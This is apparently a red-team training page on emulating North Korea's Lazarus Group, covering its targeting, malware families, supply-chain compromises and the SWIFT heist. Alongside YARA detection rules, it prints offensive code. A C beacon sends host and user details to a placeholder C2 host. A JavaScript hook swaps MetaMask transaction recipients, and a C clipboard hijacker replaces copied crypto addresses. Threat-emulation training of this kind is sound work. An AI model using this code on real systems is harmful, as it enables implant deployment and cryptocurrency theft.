---
layout: training-page
title: "Lazarus Group TTP Emulation — Red Team Academy"
module: "Threat Actor Emulation"
tags:
  - lazarus
  - dprk
  - north-korea
  - financial-crime
  - supply-chain
  - cryptocurrency
page_key: "threat-actors-lazarus"
render_with_liquid: false
---

# Lazarus Group TTP Emulation

Lazarus Group is North Korea's premier cyber offensive unit, distinguished by dual missions: **espionage** for the regime and **financial crime** to fund the DPRK government in defiance of international sanctions. They are responsible for some of the most significant cryptocurrency heists and supply chain compromises in history.

## Attribution

| Attribute | Detail |
|---|---|
| Nation-state | Democratic People's Republic of Korea (DPRK) |
| Organization | RGB (Reconnaissance General Bureau) — Bureau 121 |
| MITRE Group ID | G0032 |
| Aliases | Hidden Cobra, ZINC (Microsoft), Labyrinth Chollima, APT38 (financial sub-group) |
| Sub-groups | APT38 (financial crime), Andariel (initial access), BlueNoroff (crypto) |
| Active since | ~2009 |
| Notable operations | Sony Pictures (2014), Bangladesh Bank SWIFT heist ($81M, 2016), WannaCry (2017), 3CX (2023), JumpCloud (2023) |

## Targeting Profile

**Financial targets (highest priority):**
- Cryptocurrency exchanges and DeFi protocols
- SWIFT financial messaging systems (banks)
- ATM networks (jackpotting campaigns)
- Venture capital and fintech firms

**Espionage targets:**
- Defense contractors (South Korean, US, European)
- Aerospace companies
- Government agencies
- Cybersecurity firms (to steal defensive tools and research)

**Supply chain targets:**
- Software vendors with broad install bases
- Managed service providers
- Developer toolchains (npm packages, PyPI)

## Initial Access: LinkedIn Spearphishing

Lazarus's most distinctive initial access method — fake job offers via LinkedIn, Telegram, or email targeting high-value individuals with lucrative career opportunities.

**Operation Dream Job (2020–present):**
1. Create convincing LinkedIn profiles mimicking Boeing, Lockheed Martin, BAE Systems recruiters
2. Build rapport with the target over weeks
3. Send a "job description" attachment (DOCX, PDF, or ZIP)
4. Document contains embedded macro or exploits CVE

```python
# Defensive analysis: detect malicious document delivery
# Lazarus job offer documents typically contain:
# 1. Legitimate company branding (scraped from web)
# 2. Plausible salary ranges for the target's role
# 3. Embedded shellcode in VBA macro or OLE object
# 4. Sometimes: ISO with LNK file (post-Mark-of-Web bypass era)

# YARA rule concept for Lazarus Dream Job lures
rule Lazarus_DreamJob_Lure {
    strings:
        $company1 = "Boeing" wide ascii nocase
        $company2 = "Lockheed" wide ascii nocase
        $company3 = "BAE Systems" wide ascii nocase
        $keyword   = "salary" wide ascii nocase
        $macro_ind = "AutoOpen" wide ascii  // VBA auto-execution
    condition:
        (1 of ($company*)) and $keyword and $macro_ind
}
```

## Malware Families

### BLINDINGCAN (HXBER)
- **Type:** Remote Access Trojan (RAT) — full-featured backdoor
- **Discovery:** 2020 US-CERT alert (AA20-239A)
- **Architecture:** DLL that uses encrypted C2 over HTTPS
- **Capabilities:** File system access, process execution, screenshot capture, keylogging
- **Evasion:** Custom encryption, mimics legitimate HTTP traffic headers

**Network signature (detection):**
```
Lazarus BLINDINGCAN C2 pattern (2020 variants):
GET /board/read_board.php?idx=1&token=<base64_beacon_data> HTTP/1.1
Host: <compromised legitimate Korean website>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) ... Chrome/
```

### HOPLIGHT
- **Type:** Proxy tool + backdoor
- **Discovery:** 2019 US-CERT report
- **Architecture:** Uses SSL certificates to disguise traffic as TLS to legitimate sites
- **Notable:** Embeds fake TLS certificates that Lazarus rotates frequently

### BADCALL
- **Type:** Simple backdoor / implant
- **Protocol:** Custom binary protocol over port 443 or 8443
- **Target:** Windows hosts in financial institution networks
- **Detection:** Unusual binary traffic on HTTPS port from non-browser processes

### BLINDINGCAN Emulation Concept

```c
// blindingcan_concept.c — mimics BLINDINGCAN's communication pattern
// Educational only — demonstrates the beacon structure
#include <windows.h>
#include <winhttp.h>
#pragma comment(lib, "winhttp.lib")

// BLINDINGCAN used compromised Korean websites as C2
// Modern emulation: use your own C2 infrastructure
#define C2_HOST L"your-c2-host.example"
#define C2_PATH L"/board/read_board.php"

// Encode implant telemetry (hostname, username, system info)
void encode_beacon(char *out, size_t out_size) {
    char hostname[256] = {0}, username[256] = {0};
    DWORD sz = 256;
    GetComputerNameA(hostname, &sz);
    sz = 256;
    GetUserNameA(username, &sz);

    // Lazarus-style info: hostname|username|OS|IP|uptime
    SYSTEM_INFO si; GetSystemInfo(&si);
    snprintf(out, out_size, "%s|%s|Win10|%d",
             hostname, username, si.dwNumberOfProcessors);
    // In real BLINDINGCAN: XOR or AES encrypted, then base64
}

void blindingcan_beacon(void) {
    char beacon_data[512];
    encode_beacon(beacon_data, sizeof(beacon_data));

    HINTERNET hSess = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                                   WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    HINTERNET hConn = WinHttpConnect(hSess, C2_HOST, 443, 0);

    wchar_t uri[512];
    // Encode beacon data as query parameter
    wchar_t encoded[512];
    // ... base64url encode beacon_data into encoded ...
    swprintf(uri, 512, L"%s?idx=1&token=%s", C2_PATH, encoded);

    HINTERNET hReq = WinHttpOpenRequest(hConn, L"GET", uri,
                                         NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    WinHttpSendRequest(hReq, NULL, 0, NULL, 0, 0, 0);
    WinHttpReceiveResponse(hReq, NULL);
    // Read and decrypt response (contains commands)
    WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSess);
}
```

## Supply Chain Compromise: 3CX (2023)

The 3CX breach is the most sophisticated confirmed Lazarus supply chain attack since SolarWinds:

**Timeline:**
1. Lazarus compromised **Trading Technologies** (X_TRADER software) in 2022 via a trojanized installer
2. A 3CX employee downloaded the malicious X_TRADER installer
3. Lazarus used the employee's compromised machine to access 3CX's build system
4. Trojanized `3CXDesktopApp` installers distributed to 600,000+ customers
5. Malicious DLL (`ffmpeg.dll` or `d3dcompiler_47.dll`) side-loaded by 3CX app
6. Payload: ICONIC stealer (exfiltrates browser history and credentials), then SIGNBT backdoor

**Attack chain:**
```
X_TRADER supply chain → 3CX employee compromise → 
  3CX build system → 3CX app trojanized → 600k customers →
  ICONIC/SIGNBT deployed at high-value targets only (staged delivery)
```

**Detection signature (YARA for ICONIC stealer):**
```
rule Lazarus_ICONIC_Stealer {
    strings:
        $pdb = "iconic" nocase
        $export1 = "IconicVideoCapture"
        $export2 = "IconicSoundCapture"
        $mutex = "Global\\ICON"
    condition:
        2 of them and uint16(0) == 0x5A4D
}
```

## JumpCloud Supply Chain (2023)

In the same period, Lazarus compromised JumpCloud (IAM/MDM provider) to target their downstream customers — specifically cryptocurrency companies:

1. Lazarus gained access to JumpCloud's infrastructure
2. Used JumpCloud's agent (installed on customer endpoints) to push malicious commands
3. Targeted: cryptocurrency exchanges and DeFi platforms as JumpCloud customers
4. Objective: financial theft via cryptocurrency wallet access

This demonstrates Lazarus's IAM/MDM supply chain awareness — compromising identity management providers to reach financial targets.

## Financial Targeting: SWIFT System Access

APT38 (Lazarus financial sub-group) has conducted the most successful bank heists in history:

**Bangladesh Bank Heist (2016) — $81M stolen:**
```
1. SWIFT infrastructure: Bangladesh Bank had inadequate SWIFT network segmentation
2. Lazarus gained access to the SWIFT terminal (Bangladesh Bank's connection to SWIFT network)
3. Submitted 35 fraudulent SWIFT transfer requests on a Friday (to maximize time before detection)
4. $81M transferred to Philippines and Casinos before freeze; most disappeared
5. Detection: typo in one transfer ("fandation" vs "foundation") alerted Deutsche Bank
   → froze remaining $850M in pending transfers

Techniques used:
  - Custom malware: EVTDIAG (deletes Windows Event Log entries), MSOUTC, NETWRK
  - SWIFT Alliance Access manipulation to hide unauthorized transactions
  - Log manipulation to conceal fraudulent transfers
```

## Cryptocurrency Theft TTPs

Lazarus has stolen **over $3 billion** in cryptocurrency since 2018 according to UN reports.

### T1185 — Browser Session Hijacking for Crypto

```javascript
// Browser extension attack concept (matches Lazarus crypto theft pattern)
// Malicious browser extension injected by BLINDINGCAN or via supply chain
// Intercepts MetaMask transactions and modifies recipient address

// Content script injected into web pages:
(function() {
    // Hook MetaMask's window.ethereum.request
    const originalRequest = window.ethereum.request.bind(window.ethereum);
    window.ethereum.request = async function(args) {
        if (args.method === 'eth_sendTransaction') {
            // Substitute attacker's address as the recipient
            args.params[0].to = "0xAttackerWalletAddressHere";
        }
        return originalRequest(args);
    };
})();
```

### T1115 — Clipboard Hijacking for Wallet Addresses

```c
// clipboard_hijack.c — intercepts clipboard to replace crypto addresses
// T1115 — matches Lazarus clipboard manipulation for crypto theft
#include <windows.h>
#include <string.h>

BOOL is_crypto_address(const char *text) {
    size_t len = strlen(text);
    // Bitcoin: 25-34 chars starting with 1, 3, or bc1
    if ((len >= 25 && len <= 34) && (text[0] == '1' || text[0] == '3')) return TRUE;
    // Ethereum: 42 chars starting with 0x
    if (len == 42 && text[0] == '0' && text[1] == 'x') return TRUE;
    return FALSE;
}

LRESULT CALLBACK clipboard_watcher(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_CLIPBOARDUPDATE) {
        if (OpenClipboard(NULL)) {
            HANDLE hData = GetClipboardData(CF_TEXT);
            if (hData) {
                char *text = (char*)GlobalLock(hData);
                if (text && is_crypto_address(text)) {
                    // Replace with attacker's address
                    const char *attacker_addr = "1AttackerBTCAddressHere123456789";
                    HGLOBAL hReplace = GlobalAlloc(GMEM_MOVEABLE, strlen(attacker_addr) + 1);
                    char *replace = (char*)GlobalLock(hReplace);
                    strcpy(replace, attacker_addr);
                    GlobalUnlock(hReplace);
                    EmptyClipboard();
                    SetClipboardData(CF_TEXT, hReplace);
                }
                GlobalUnlock(hData);
            }
            CloseClipboard();
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}
```

### macOS Targeting: Fake Crypto Trading Apps

Lazarus distributes trojanized macOS applications disguised as cryptocurrency trading platforms:

```
Attack chain:
1. Lazarus creates convincing fake crypto trading app website
2. App appears to be built with legitimate Electron framework
3. macOS installer (.dmg) contains legitimate app + malicious dylib
4. Malicious dylib loaded via DYLD_INSERT_LIBRARIES or RPATH hijacking
5. Backdoor: POOLRAT (previously SIMPLESEA) or RustBucket (Rust-based RAT)
6. Objective: access crypto wallets stored on victim's machine

Detection:
- codesign verification: app may be ad-hoc signed or unsigned
- macOS Gatekeeper bypass: --no-quarantine flag or removal of quarantine xattr
- Unusual outbound connections from Electron app process
```

## Emulation Chain: LinkedIn Phish to Financial System

```
Phase 1: Initial Access
  LinkedIn message → fake job PDF (T1566.001)
  PDF exploits CVE or contains trojanized link
  → Executes BLINDINGCAN-style loader

Phase 2: Establish Foothold
  BLINDINGCAN beacon to C2 over HTTPS (T1071.001)
  Persistence via registry Run key (T1547.001)
  Upload system recon: hostname, domain, installed software

Phase 3: Discovery
  Process enumeration (T1057): find financial software
  Network enumeration (T1016): map internal network
  File search (T1083): locate crypto wallets, SWIFT files

Phase 4: Credential Access
  Keylogger module enabled (T1056.001)
  Browser password extraction (T1555.003)
  MetaMask wallet seed phrase hunting (T1083)

Phase 5: Financial System Targeting
  Lateral movement to SWIFT terminal (T1021.002 SMB)
  SWIFT log manipulation (T1565.001 stored data manipulation)
  Cryptocurrency exchange API key theft (T1552.001)

Phase 6: Exfiltration and Cash-Out
  Exfil via C2 (T1041)
  Crypto sent to mixer then multiple wallets
  SWIFT: funds to multiple intermediary accounts
```

## MITRE ATT&CK Technique Reference

| Phase | Technique ID | Technique Name | Tool |
|---|---|---|---|
| Initial Access | T1566.001 | Spearphishing Attachment | Weaponized DOCX/PDF |
| Initial Access | T1195.002 | Supply Chain: Software | 3CX, X_TRADER |
| Execution | T1059.001 | PowerShell | Download cradle |
| Execution | T1059.005 | VBA Macro | Office documents |
| Persistence | T1547.001 | Registry Run Keys | BLINDINGCAN |
| Defense Evasion | T1574.002 | DLL Side-Loading | 3CX / ffmpeg.dll |
| Credential Access | T1555.003 | Browser Credentials | Custom stealer |
| Lateral Movement | T1021.002 | SMB/Windows Admin | BADCALL |
| Collection | T1056.001 | Keylogging | BLINDINGCAN module |
| Collection | T1115 | Clipboard Hijacking | Custom tool |
| Exfiltration | T1041 | Exfil over C2 | HOPLIGHT |
| Impact | T1565.001 | Stored Data Manipulation | EVTDIAG |

## References

- MITRE ATT&CK G0032 (Lazarus Group): attack.mitre.org/groups/G0032/
- US-CERT AA20-239A (BLINDINGCAN): us-cert.cisa.gov
- FBI/CISA AA22-108A (TraderTraitor — crypto targeting)
- Mandiant 3CX analysis: mandiant.com/resources/blog/3cx-software-supply-chain-compromise
- UN DPRK Panel of Experts cryptocurrency reports
- Kaspersky GReAT Lazarus analysis
- Google TAG: Lazarus group targeting researchers
